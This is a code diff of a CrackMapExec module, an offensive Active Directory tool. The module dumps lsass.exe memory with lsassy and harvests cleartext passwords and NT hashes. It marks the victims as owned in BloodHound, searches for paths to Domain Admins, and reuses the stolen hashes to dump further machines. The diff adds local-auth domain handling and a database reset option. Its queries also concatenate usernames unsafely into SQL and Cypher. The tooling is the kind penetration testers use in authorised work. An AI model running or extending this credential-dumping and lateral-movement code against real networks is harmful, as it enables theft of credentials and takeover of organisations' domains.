@@ -1,8 +1,7 @@
 # Author:
 # Peter Gormington @hackerm00n on Twitter
 
-import sqlite3
-import configparser
+from sqlite3 import connect
 from sys import exit
 from neo4j import GraphDatabase, basic_auth
 from neo4j.exceptions import AuthError, ServiceUnavailable
@@ -63,27 +62,30 @@ def create_db(local_admins, dbconnection, cursor):
     dbconnection.commit()
 
 def process_creds(context, connection, credentials_data, dbconnection, cursor, driver):
-    context.log.extra['host'] = connection.domain
+    if connection.args.local_auth:
+        context.log.extra['host'] = connection.conn.getServerDNSDomainName()
+    else:
+        context.log.extra['host'] = connection.domain
     context.log.extra['hostname'] = connection.host.upper()
     for result in credentials_data:
         username = result["username"].upper().split('@')[0]
         nthash = result["nthash"]
         password = result["password"]
         if result["password"] != None:
-            context.log.success(f"Found a cleartext password for: {username}:{password}. Adding to the DB and marking user as owned in BH.")
+            context.log.highlight(f"Found a cleartext password for: {username}:{password}. Adding to the DB and marking user as owned in BH.")
             cursor.execute("UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'", [password])
-            username = (f"{username.upper()}@{connection.domain.upper()}")
+            username = (f"{username.upper()}@{context.log.extra['host'].upper()}")
             dbconnection.commit()
             session = driver.session()
             session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
         if nthash == 'aad3b435b51404eeaad3b435b51404ee' or nthash =='31d6cfe0d16ae931b73c59d7e0c089c0':
             context.log.error(f"Hash for {username} is expired.")
         elif username not in found_users and nthash != None:
-            context.log.success(f"Found hashes for: '{username}:{nthash}'. Adding them to the DB and marking user as owned in BH.")
+            context.log.highlight(f"Found hashes for: '{username}:{nthash}'. Adding them to the DB and marking user as owned in BH.")
             found_users.append(username)
             cursor.execute("UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'", [nthash])
             dbconnection.commit()
-            username = (f"{username.upper()}@{connection.domain.upper()}")
+            username = (f"{username.upper()}@{context.log.extra['host'].upper()}")
             session = driver.session()
             session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
             path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.owned=true AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
@@ -116,17 +118,14 @@ class CMEModule:
         """
             METHOD              Method to use to dump lsass.exe with lsassy
             RESET_DUMPED        Allows re-dumping of computers. (Default: False)
+            RESET               Reset DB. (Default: False)
         """
         self.method = 'comsvcs'
         if 'METHOD' in module_options:
             self.method = module_options['METHOD']
         self.reset_dumped = module_options.get('RESET_DUMPED', False)
-        if self.reset_dumped != False:
-            try:
-                cursor.execute("UPDATE pc_and_admins SET dumped = 'False'")
-                context.log.info("PCs can be dumped again.")
-            except Exception:
-                pass
+        self.reset = module_options.get('RESET', False)
+
 
     def run_lsassy(self, context, connection): # Couldn't figure out how to properly retrieve output from the module without editing. Blatantly ripped from lsassy_dump.py. Thanks pixis - @hackanddo!
         logger.init(quiet=True)
@@ -186,8 +185,10 @@ class CMEModule:
                     more_to_dump = cursor.fetchall()
                     if len(more_to_dump) > 0:
                         context.log.info(f"User {user[0]} has more access to {pc[0]}. Attempting to dump.")
+                        connection.domain = user[0].split('@')[1]
                         setattr(connection, "host", pc[0].split('.')[0])
                         setattr(connection, "username", user[0].split('@')[0])
+                        setattr(connection, "nthash", user[1])
                         setattr(connection, "nthash", user[1])
                         try:
                             self.run_lsassy(context, connection)
@@ -202,8 +203,26 @@ class CMEModule:
         
     def on_admin_login(self, context, connection):
         db_path = connection.config.get('CME', 'workspace')
-        dbconnection = sqlite3.connect(db_path, check_same_thread=False, isolation_level=None) # Sqlite DB will be saved at ./CrackMapExec/default if name in cme.conf is default
+        dbconnection = connect(db_path, check_same_thread=False, isolation_level=None) # Sqlite DB will be saved at ./CrackMapExec/default if name in cme.conf is default
         cursor = dbconnection.cursor()
+        if self.reset != False:
+            try:
+                cursor.execute("DROP TABLE IF EXISTS admin_users;")
+                cursor.execute("DROP TABLE IF EXISTS pc_and_admins;")
+                context.log.info("Database reseted")
+                exit()
+            except Exception as e:
+                context.log.error("Database reset error", str(e))
+                exit
+
+        if self.reset_dumped != False:
+            try:
+                cursor.execute("UPDATE pc_and_admins SET dumped = 'False'")
+                context.log.info("PCs can be dumped again.")
+            except Exception as e:
+                context.log.error("Database update error", str(e))
+                exit
+
         neo4j_user = connection.config.get('BloodHound', 'bh_user')
         neo4j_pass = connection.config.get('BloodHound', 'bh_pass')
         neo4j_uri = connection.config.get('BloodHound', 'bh_uri')
